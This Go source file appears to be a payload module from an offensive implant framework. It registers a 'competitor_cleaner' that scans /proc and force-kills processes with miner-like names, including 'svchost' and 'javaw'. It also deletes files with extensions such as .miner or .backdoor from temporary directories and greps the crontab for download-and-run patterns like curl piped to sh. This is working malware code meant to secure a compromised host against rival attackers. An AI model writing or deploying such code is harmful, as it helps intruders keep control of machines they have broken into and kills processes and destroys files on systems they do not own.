package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
)

func init() {
	Register(&CompetitorCleaner{})
}

type CompetitorCleaner struct{}

func (c *CompetitorCleaner) Name() string     { return "competitor_cleaner" }
func (c *CompetitorCleaner) Category() string { return "impact" }
func (c *CompetitorCleaner) Description() string {
	return "Detect and remove competing implants, backdoors, and miners"
}

func (c *CompetitorCleaner) Execute(args map[string]string) ([]byte, error) {
	result := c.clean()
	return MarshalJSON(result)
}

type compCleanResult struct {
	Timestamp string     `json:"timestamp"`
	Processes []compItem `json:"suspicious_processes"`
	Files     []compItem `json:"suspicious_files"`
	Crons     []compItem `json:"suspicious_crons"`
	Removed   int        `json:"removed"`
	Statuses  []string   `json:"statuses"`
}

type compItem struct {
	PID     int    `json:"pid,omitempty"`
	Name    string `json:"name"`
	Path    string `json:"path,omitempty"`
	Entry   string `json:"entry,omitempty"`
	Reason  string `json:"reason"`
	Removed bool   `json:"removed"`
}

var suspiciousProcessNames = []string{
	"minerd", "cpuminer", "xmrig", "ccminer", "ethminer",
	"javaw", "svchost",
}

var suspiciousCronPatterns = []*regexp.Regexp{
	regexp.MustCompile(`curl.*\|.*sh`),
	regexp.MustCompile(`wget.*-O.*\.sh`),
	regexp.MustCompile(`python.*http`),
	regexp.MustCompile(`perl.*-e`),
	regexp.MustCompile(`base64.*decode`),
}

func (c *CompetitorCleaner) clean() *compCleanResult {
	r := &compCleanResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Scan processes
	procDir, _ := os.Open("/proc")
	if procDir != nil {
		entries, _ := procDir.Readdirnames(-1)
		procDir.Close()
		for _, e := range entries {
			pid := 0
			fmt.Sscanf(e, "%d", &pid)
			if pid == 0 || pid == os.Getpid() {
				continue
			}
			comm, _ := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
			name := strings.TrimSpace(string(comm))
			if name == "" {
				continue
			}
			for _, sp := range suspiciousProcessNames {
				if strings.Contains(strings.ToLower(name), sp) {
					item := compItem{
						PID:    pid,
						Name:   name,
						Reason: fmt.Sprintf("Matching process: %s", sp),
					}
					// Kill
					if syscall.Kill(pid, syscall.SIGKILL) == nil {
						item.Removed = true
						r.Removed++
					}
					r.Processes = append(r.Processes, item)
					r.Statuses = append(r.Statuses, fmt.Sprintf("Killed process: %s (PID %d)", name, pid))
					break
				}
			}
		}
	}

	// Scan files
	scanPaths := []string{"/tmp", "/dev/shm", "/var/tmp"}
	for _, sp := range scanPaths {
		filepath.Walk(sp, func(path string, fi os.FileInfo, err error) error {
			if err != nil || fi.IsDir() {
				return nil
			}
			suspiciousExts := []string{".miner", ".bot", ".malware", ".backdoor", ".crypt"}
			ext := strings.ToLower(filepath.Ext(path))
			for _, se := range suspiciousExts {
				if ext == se {
					item := compItem{
						Path:   path,
						Reason: fmt.Sprintf("Suspicious extension: %s", ext),
					}
					if os.Remove(path) == nil {
						item.Removed = true
						r.Removed++
					}
					r.Files = append(r.Files, item)
					r.Statuses = append(r.Statuses, fmt.Sprintf("Removed file: %s", path))
					return nil
				}
			}
			return nil
		})
	}

	// Scan crons
	cronOut, _ := exec.Command("crontab", "-l").CombinedOutput()
	if len(cronOut) > 0 {
		for _, pattern := range suspiciousCronPatterns {
			matches := pattern.FindAllString(string(cronOut), -1)
			for _, m := range matches {
				item := compItem{
					Entry:  m,
					Reason: "Suspicious cron pattern",
				}
				r.Crons = append(r.Crons, item)
				r.Statuses = append(r.Statuses, fmt.Sprintf("Found suspicious cron: %s", m))
			}
		}
	}

	return r
}
